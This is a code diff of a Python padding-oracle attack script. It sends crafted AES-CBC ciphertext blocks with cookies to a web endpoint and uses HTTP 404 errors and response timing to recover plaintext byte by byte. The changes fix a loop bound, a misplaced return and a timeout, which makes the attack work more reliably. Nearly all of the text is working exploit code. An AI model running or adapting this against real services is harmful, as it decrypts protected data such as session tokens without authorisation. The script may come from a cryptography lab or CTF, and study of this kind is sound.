@@ -87,7 +87,7 @@ def decryptAESError(c, i, blockSize, cookies):
             r = requests.get(
                 f"{ERROR_URI}{cprime.hex()}{c2.hex()}",
                 cookies=cookies,
-                timeout=30,
+                timeout=60,
             )
             if r.status_code == 404:
                 # valid padding
@@ -147,7 +147,7 @@ def decryptAESTime(c, i, blockSize, cookies):
                 print(f"[{i}]Pad not found  j:{j} Retrying")
                 newvalue = 0
 
-        print(f"[{i}]MaxTime: {maxtime} Index:{maxtimevalue}")
+        print(f"[{i}]MaxTime: {maxtime} Padding:{maxtimevalue}")
         y = maxtimevalue ^ (blockSize - j)
         yy[j] = y
         plain[j] = y ^ c1[j]
@@ -160,7 +160,7 @@ def decryptAESTime(c, i, blockSize, cookies):
 
 def decryptAESTimesec(c, blockSize, cookies):
     plaintexts = bytearray()
-    for i in range(len(c)):
+    for i in range(len(c)-1):
         c1 = c[i]
         c2 = c[i + 1]
         print(f"\n[Time Oracle]Trying decrypting block {i+1} \nc1: {c1}\nc2: {c2}")
@@ -192,7 +192,7 @@ def decryptAESTimesec(c, blockSize, cookies):
                     maxtime = newtime
                     maxtimevalue = newvalue
 
-            print(f"[{i}]MaxTime: {maxtime} Index:{maxtimevalue}")
+            print(f"[{i}]MaxTime: {maxtime} Padding:{maxtimevalue}")
             y = maxtimevalue ^ (blockSize - j)
             yy[j] = y
             plain[j] = y ^ c1[j]
@@ -200,7 +200,7 @@ def decryptAESTimesec(c, blockSize, cookies):
             maxtimevalue = 0
         plaintexts = plaintexts + plain
         print(f"c2[{i}] Plain text: {plain}")
-        return plaintexts
+    return plaintexts
 
 
 def testPlainText(plaintextsFuture, cookies, oracle="error"):
